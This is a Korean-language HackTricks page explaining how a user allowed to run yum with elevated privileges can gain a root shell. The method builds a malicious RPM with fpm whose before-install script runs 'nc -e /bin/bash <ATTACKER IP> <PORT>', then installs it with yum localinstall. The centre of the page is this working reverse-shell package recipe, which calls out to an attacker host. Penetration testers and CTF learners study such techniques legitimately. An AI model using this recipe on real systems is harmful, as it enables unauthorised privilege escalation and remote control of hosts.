<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **Hacking 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 저장소에 제출**하세요.

</details>

yum에 대한 추가적인 예제는 [gtfobins](https://gtfobins.github.io/gtfobins/yum/)에서도 찾을 수 있습니다.

# RPM 패키지를 통한 임의의 명령 실행
## 환경 확인
이 벡터를 활용하기 위해서는 사용자가 루트와 같은 더 높은 권한을 가진 사용자로 yum 명령을 실행할 수 있어야 합니다.

### 이 벡터의 작동 예제
이 exploit의 작동 예제는 [tryhackme](https://tryhackme.com)의 [daily bugle](https://tryhackme.com/room/dailybugle) 룸에서 찾을 수 있습니다.

## RPM 패키지 패킹
다음 섹션에서는 [fpm](https://github.com/jordansissel/fpm)을 사용하여 RPM에 역쉘을 패키징하는 방법을 다룰 것입니다.

아래 예제는 임의의 스크립트를 포함하는 before-install 트리거를 포함하는 패키지를 생성합니다. 이 패키지가 설치되면 임의의 명령이 실행됩니다. 간단한 역쉘 예제로는 reverse netcat shell을 사용했지만 필요에 따라 변경할 수 있습니다.
```text
EXPLOITDIR=$(mktemp -d)
CMD='nc -e /bin/bash <ATTACKER IP> <PORT>'
RPMNAME="exploited"
echo $CMD > $EXPLOITDIR/beforeinstall.sh
fpm -n $RPMNAME -s dir -t rpm -a all --before-install $EXPLOITDIR/beforeinstall.sh $EXPLOITDIR
```
# 쉘 획득
위의 예제를 사용하고 `yum`이 더 높은 권한을 가진 사용자로 실행될 수 있다고 가정합니다.

1. 호스트로 rpm을 **전송**합니다.
2. 로컬 호스트에서 [예시 netcat 리스너](/shells/shells/linux#netcat)와 같은 **리스너를 시작**합니다.
3. 취약한 패키지를 `yum localinstall -y exploited-1.0-1.noarch.rpm` 명령으로 **설치**합니다.


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* 회사를 **HackTricks에서 광고**하거나 **PDF로 HackTricks 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 상품**](https://peass.creator-spring.com)을 구매하세요.
* 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 기법을 공유**하세요.

</details>
